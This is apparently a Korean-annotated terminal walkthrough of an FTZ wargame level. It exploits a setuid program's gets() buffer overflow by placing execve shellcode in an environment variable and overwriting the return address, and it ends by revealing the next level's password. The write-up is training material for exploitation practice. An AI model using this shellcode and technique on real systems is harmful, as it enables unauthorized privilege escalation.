@@ -1,0 +1,102 @@
+login as: level12
+level12@hhytruth's password:
+[level12@ftz level12]$ ll
+total 28
+-rwsr-x---    1 level13  level12     13771 Mar  8  2003 attackme
+-rw-r-----    1 root     level12       204 Mar  8  2003 hint
+drwxr-xr-x    2 root     level12      4096 Feb 24  2002 public_html
+drwxrwxr-x    2 root     level12      4096 Jan 15  2009 tmp
+[level12@ftz level12]$ cat hint
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main( void )
+{
+        char str[256];
+
+        setreuid( 3093, 3093 );
+        printf( "문장을 입력하세요.\n" );
+        gets( str );
+        printf( "%s\n", str );
+}
+
+
+[level12@ftz level12]$ gdb attackme
+GNU gdb Red Hat Linux (5.3post-0.20021129.18rh)
+Copyright 2003 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux-gnu"...
+(gdb) disas main	### attackme의 main 디버깅
+Dump of assembler code for function main:
+0x08048470 <main+0>:    push   %ebp
+0x08048471 <main+1>:    mov    %esp,%ebp
+0x08048473 <main+3>:    sub    $0x108,%esp	
+0x08048479 <main+9>:    sub    $0x8,%esp		### 256버퍼+8더미
+0x0804847c <main+12>:   push   $0xc15
+0x08048481 <main+17>:   push   $0xc15
+0x08048486 <main+22>:   call   0x804835c <setreuid>
+0x0804848b <main+27>:   add    $0x10,%esp
+0x0804848e <main+30>:   sub    $0xc,%esp
+0x08048491 <main+33>:   push   $0x8048538
+0x08048496 <main+38>:   call   0x804834c <printf>
+0x0804849b <main+43>:   add    $0x10,%esp
+0x0804849e <main+46>:   sub    $0xc,%esp
+0x080484a1 <main+49>:   lea    0xfffffef8(%ebp),%eax
+0x080484a7 <main+55>:   push   %eax
+0x080484a8 <main+56>:   call   0x804831c <gets>
+0x080484ad <main+61>:   add    $0x10,%esp
+0x080484b0 <main+64>:   sub    $0x8,%esp
+0x080484b3 <main+67>:   lea    0xfffffef8(%ebp),%eax
+0x080484b9 <main+73>:   push   %eax
+0x080484ba <main+74>:   push   $0x804854c
+0x080484bf <main+79>:   call   0x804834c <printf>
+0x080484c4 <main+84>:   add    $0x10,%esp
+0x080484c7 <main+87>:   leave
+0x080484c8 <main+88>:   ret
+0x080484c9 <main+89>:   lea    0x0(%esi),%esi
+0x080484cc <main+92>:   nop
+0x080484cd <main+93>:   nop
+0x080484ce <main+94>:   nop
+0x080484cf <main+95>:   nop
+End of assembler dump.
+
+[level12@ftz level12]$ cd tmp
+[level12@ftz tmp]$ cat > shell.c
+#include <stdio.h>
+int main(){
+printf("%p\n",getenv("shellcode"));
+return 0;
+}
+### 쉘 코드를 출력해주는 파일 작성
+[5]+  Stopped                 cat >shell.c
+[level12@ftz tmp]$ gcc -o shell shell.c
+
+[level12@ftz tmp]$ cp ../attackme ./attackme	### tmp 폴더로 attackme파일 복사
+[level12@ftz tmp]$ ll
+total 36
+-rwxr-x---    1 level12  level12     13771 Dec 22 00:50 attackme
+-rwxrwxr-x    1 level12  level12     11656 Dec 22 00:49 shell
+-rw-rw-r--    1 level12  level12        79 Dec 22 00:49 shell.c
+-rw-rw-r--    1 level12  level12        78 Dec 22 00:48 temp.c
+[level12@ftz tmp]$ export shellcode=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')		### export shellcode로 환경변수에 쉘코드 등록
+### 쉘코드 내용이 실제로 경로를 포함하고 있으므로 환경변수 등록시 경로임을 표시하는 “$”를 붙여줘야 한다.
+
+[level12@ftz tmp]$ ./shell	### 파일 실행
+0xbfffff08	### 쉘코드 주소 출력..
+[level12@ftz tmp]$ cd ..
+[level12@ftz level12]$ cd tmp
+
+### 페이로드: (python -c ‘print “\x90”*[str~ret거리]+[쉘코드 주소]’;cat|./attackme)
+
+문장을 입력하세요.
+릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱?릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱?릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱
+my-pass
+TERM environment variable not set.
+
+Level13 Password is “have no clue”.
